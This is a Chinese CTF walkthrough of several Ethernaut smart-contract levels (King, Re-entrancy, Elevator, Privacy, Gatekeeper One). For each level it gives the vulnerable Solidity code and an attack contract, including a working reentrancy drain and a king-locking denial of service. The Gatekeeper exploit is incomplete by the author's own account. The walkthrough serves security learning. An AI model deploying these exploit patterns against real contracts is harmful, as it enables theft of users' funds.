### 前言
这里继续接着"Ethernaut闯关录(上)"中的闯关模式继续对剩下的关卡进行闯关。
### 闯关斩将
#### King
##### 闯关要求
合同代表一个非常简单的游戏：谁给它发送了比当前奖金还大的数量的以太，就成为新的国王。在这样的事件中，被推翻的国王获得了新的奖金，但是如果你提交的话那么合约就会回退，让level重新成为国王，而我们的目标就是阻止这一情况的发生。
##### 合约代码
    pragma solidity ^0.4.18;
    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
    contract King is Ownable {
      address public king;
      uint public prize;
      function King() public payable {
        king = msg.sender;
        prize = msg.value;
      }
      function() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
      }
    }
##### 合约分析
从上面的代码中可以看到当国王被推翻时国王将会获得奖金，那么只要国王拒绝接受奖金就可以一直是国王。  
通过上面的代码分析，我们可以部署以下攻击合约,当原智能合约有新的king诞生时会向我们的合约退还之前的奖金，但是攻击合约不接收，直接revert()那么就可以永远占据合约的king不放：
    pragma solidity ^0.4.18;
    contract attack{
        function attack(address _addr) public payable{
            _addr.call.gas(10000000).value(msg.value)();
        }
        function () public {
            revert();
        }
    }
##### 攻击流程
点击“Get new Instance”来获取一个实例：  
之后先来查看一下prize值以及合约的king、合约的地址  
之后我们在remix中编译并部署攻击合约：  
合约部署地址：  
之后再次查看king，发现已经变成了我们攻击合约的地址：  
之后我们点击“submit instance”来提交该实例：  
之后成功过关，当我们查看king时发现依旧是我们的攻击合约的地址：  
#### Re-entrancy
##### 闯关要求
盗取合约中的所有代币。
##### 合约代码
    pragma solidity ^0.4.18;
    import 'openzeppelin-solidity/contracts/math/SafeMath.sol';
    contract Reentrance {
      using SafeMath for uint256;
      mapping(address => uint) public balances;
      function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
      }
      function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
      }
      function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
          if(msg.sender.call.value(_amount)()) {
            _amount;
          }
          balances[msg.sender] -= _amount;
        }
      }
      function() public payable {}
    }
##### 合约分析
从上面的源代码可以确定这里应该为以太坊里的重入攻击，这也是之前The DAO事件里黑客所用到的攻击。  
在这里我们重点来看withdraw函数，我们可以看到它接收了一个_amount参数，将其与发送者的balance进行比较，不超过发送者的balance就将这些_amount发送给sender，同时我们注意到这里它用来发送ether的函数是call.value,发送完成后，它才在下面更新了sender的balances，这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它卡在call.value这里不断给我们发送ether，同样利用的是我们熟悉的fallback函数来实现。
当然，这里还有另外一个关键的地方——call.value函数特性，当我们使用call.value()来调用代码时，执行的代码会被赋予账户所有可用的gas,这样就能保证我们的fallback函数能被顺利执行，对应的，如果我们使用transfer和send函数来发送时，代码可用的gas仅有2300而已，这点gas可能仅仅只够捕获一个event，所以也将无法进行可重入攻击，因为send本来就是transfer的底层实现，所以他两性质也差不多。
根据上面的简易分析，我们可以编写一下EXP代码：
    pragma solidity ^0.4.18;
    contract Reentrance {
      mapping(address => uint) public balances;
      function donate(address _to) public payable {
        balances[_to] = balances[_to]+msg.value;
      }
      function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
      }
      function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
          if(msg.sender.call.value(_amount)()) {
            _amount;
          }
          balances[msg.sender] -= _amount;
        }
      }
      function() public payable {}
    }
    contract ReentrancePoc {
        Reentrance reInstance;
        function getEther() public {
            msg.sender.transfer(address(this).balance);
        }
        function ReentrancePoc(address _addr) public{
            reInstance = Reentrance(_addr);
        }
        function callDonate() public payable{
            reInstance.donate.value(msg.value)(this);
        }
        function attack() public {
            reInstance.withdraw(1 ether);
        }
      function() public payable {
          if(address(reInstance).balance >= 1 ether){
            reInstance.withdraw(1 ether);
          }
      }
    }
##### 攻击流程
点击“Get new Instance”来获取一个实例：  
之后获取instance合约的地址  
之后在remix中部署攻击合约  
我们需要在受攻击的合约里给我们的攻击合约地址增加一些balance以完成withdraw第一步的检查：
    contract.donate.sendTransaction("0xeE59e9DC270A52477d414f0613dAfa678Def4b02",{value: toWei(1)})
这样就成功给我们的攻击合约的balance增加了1
ether，这里的sendTransaction跟web3标准下的用法是一样的，这时你再使用getbalance去看合约拥有的eth就会发现变成了2，说明它本来上面存了1个eth，然后我们返回攻击合约运行attack函数就可以完成攻击了:  
查看balance,在交易前后的变化：  
最后点击“submit instance”来提交示例即可：  
#### Elevator
##### 闯关条件
这个电梯似乎并不会让你到达顶层，所以我们的闯关条件就是绕过这一限制
##### 合约代码
    pragma solidity ^0.4.18;
    interface Building {
      function isLastFloor(uint) view public returns (bool);
    }
    contract Elevator {
      bool public top;
      uint public floor;
      function goTo(uint _floor) public {
        Building building = Building(msg.sender);
        if (!building.isLastFloor(_floor)) {
          floor = _floor;
          top = building.isLastFloor(floor);
        }
      }
    }
##### 合约分析
在合约的开头处有一个Building接口，定义了isLastFloor函数，返回值是bool，应该是用来返回这一楼层是否为最顶层，在接口里没有函数是已实现的，类似于抽象合约，可以理解为它仅仅用来提供一个标准，这样继承于它的合约就可以遵照它的标准来进行交互，而接口内的函数在其调用合约内定义即可。
之后在下面的主合约里，定义了一个bool型的top变量，在goto函数里对传入的_floor变量进行了判断，从逻辑上我们发现判断的条件里如果isLastFloor返回false，通过if后再将isLastFloor的返回值赋给top，这样的话我们的top还是个false，而这里我们要想让top的值变为true，那么我们得想个办法在isLastFloor上动动手脚，由于goTo函数调用了两次isLastFloor，因此我们可以将该函数构造为取反函数即可：
    pragma solidity ^0.4.18;
    interface Building {
      function isLastFloor(uint) view public returns (bool);
    }
    contract Elevator {
      bool public top;
      uint public floor;
      function goTo(uint _floor) public {
        Building building = Building(msg.sender);
        if (!building.isLastFloor(_floor)) {
          floor = _floor;
          top = building.isLastFloor(floor);
        }
      }
    }
    contract BuildingEXP{
        Elevator ele;
        bool t = true;
        function isLastFloor(uint) view public returns (bool) {
            t = !t;
            return t;
        }
        function attack(address _addr) public{
            ele = Elevator(_addr);
            ele.goTo(5);
        }
    }
##### 攻击流程
点击"Get new Instance"来获取一个实例：  
之后获取合约的地址和当前top的值：  
之后在remix中部署合约：  
之后调用attack来实施攻击，并且将合约地址进行传参：  
之后查看top值发现已经变为了true：  
之后点击“submit instance”来提交示例：  
#### Privacy
##### 闯关条件
将locked成为false
##### 合约代码
    pragma solidity ^0.4.18;
    contract Privacy {
      bool public locked = true;
      uint256 public constant ID = block.timestamp;
      uint8 private flattening = 10;
      uint8 private denomination = 255;
      uint16 private awkwardness = uint16(now);
      bytes32[3] private data;
      function Privacy(bytes32[3] _data) public {
        data = _data;
      }
      function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
      }
      /*
        A bunch of super advanced solidity algorithms...
          ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
          .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
          *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
          `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
          ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
      */
    }
##### 合约分析
根据solidity 文档中的变量存储原则,evm每一次处理32个字节,而不足32字节的变量相互共享并补齐32字节。 那么我们简单分析下题目中的变量：
    bool public locked = true;  //1 字节 01
    uint256 public constant ID = block.timestamp; //32 字节
    uint8 private flattening = 10; //1 字节 0a
    uint8 private denomination = 255;//1 字节 ff
    uint16 private awkwardness = uint16(now);//2 字节
    bytes32[3] private data;
第一个32
字节就是由locked、flattening、denomination、awkwardness组成，另外由于常量(constant)是无需存储的，所以从第二个32
字节开始就是 data。 因此只需要将第四个存储槽内容取出即可。
取出语句为：web3.eth.getStorageAt(instance,3,function(x,y){console.info(y);})
##### 攻击流程
点击“Get new instance”来获取一个实例：  
之后将第四个存储槽内容取出，并将前16字节内容由于unlock：
    web3.eth.getStorageAt(instance,3,function(x,y){console.info(y);})
之后查看locked的状态，已变为“flase”  
之后点击“submit instance”来提交该实例：  
#### Gatekeeper One
##### 闯关条件
绕过三个函数修饰器的限制。
##### 合约代码
    pragma solidity ^0.4.18;
    import 'openzeppelin-solidity/contracts/math/SafeMath.sol';
    contract GatekeeperOne {
      using SafeMath for uint256;
      address public entrant;
      modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
      }
      modifier gateTwo() {
        require(msg.gas.mod(8191) == 0);
        _;
      }
      modifier gateThree(bytes8 _gateKey) {
        require(uint32(_gateKey) == uint16(_gateKey));
        require(uint32(_gateKey) != uint64(_gateKey));
        require(uint32(_gateKey) == uint16(tx.origin));
        _;
      }
      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
      }
    }
##### 合约分析
从上面了解到要想enter需要满足gateOne、gateTwo、gateThree三个修饰器的检查条件，即需要满足以下条件：  
1、gateOne ：这个通过部署一个中间恶意合约即可绕过  
2、gateTwo ：这里的msg.gas 指的是运行到当前指令还剩余的 gas 量，要能整除 8191。那我们只需要 8191+x ，x 为从开始到运行完
msg.gas 所消耗的 gas。通过查阅资料发现msg.gas在文档里的描述是remaining gas，在Javascript
VM环境下进行Debug可在Step detail 栏中可以看到这个变量，笔者在调试过程中未发现合适的gas值，暂未成功！  
3、gateThree() 也比较简单，将 tx.origin 倒数三四字节换成 0000 即可。 bytes8(tx.origin) &
0xFFFFFFFF0000FFFF 即可满足条件。  
根据上面的分析给出EXP代码如下(笔者这里没有成功，主要是gateTwo的问题，没有找到合适的gas，而且编译器不同，初始gas值不同都会影响)：
    pragma solidity ^0.4.18;
    contract GatekeeperOne {
      address public entrant;
      modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
      }
      modifier gateTwo() {
        require(msg.gas % 8191 == 0);
        _;
      }
      modifier gateThree(bytes8 _gateKey) {
        require(uint32(_gateKey) == uint16(_gateKey));
        require(uint32(_gateKey) != uint64(_gateKey));
        require(uint32(_gateKey) == uint16(tx.origin));
        _;
      }
      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
      }
    }
    contract Attack {
        address instance_address = instance_address_here;
        bytes8 _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
        GatekeeperOne target = GatekeeperOne(instance_address);
        function hack() public {
            target.call.gas(适当的gas)(bytes4(keccak256("enter(bytes8)")), _gateKey);
        }
    }
##### 攻击流程
虽然没有成功，但是这里思路是正确的，下面简单给一下流程，首先点击“Get new instance”来获取一个实例：  
获取实例地址  